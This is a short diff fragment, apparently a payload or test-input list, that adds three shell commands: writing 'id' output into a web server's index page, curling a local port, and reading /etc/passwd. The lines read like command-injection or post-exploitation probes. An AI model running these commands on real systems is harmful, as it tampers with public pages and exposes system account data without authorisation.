@@ -1,0 +1,3 @@
+id >> /var/www/html/index.html
+curl localhost:5337
+cat /etc/passwd
